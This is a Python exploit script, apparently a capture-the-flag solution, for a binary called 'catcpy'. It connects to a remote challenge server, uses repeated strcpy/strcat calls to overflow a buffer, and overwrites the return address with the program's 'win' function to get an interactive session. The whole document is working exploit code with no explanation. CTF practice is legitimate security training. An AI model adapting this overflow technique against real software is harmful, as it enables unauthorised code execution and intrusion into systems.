from ptrlib import *

binary = "./catcpy"
elf = ELF(binary)

r = Socket("nc 34.170.146.252 13997")
def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

def strcpy(data):
    r.sendlineafter("> ", "1")
    r.sendlineafter("Data: ", data)

def strcat(data):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Data: ", data)

print("win:", hex(elf.symbol("win")))

for i in range(7):
    strcpy("A" * (0x100 - 1))
    strcat("A" * (1 + 24 + (6 - i)))

strcpy("A" * (0x100 - 1))
strcat(b"A" * (1 + 24) + p64(elf.symbol("win")))

r.sendlineafter(">", "4")
r.interactive()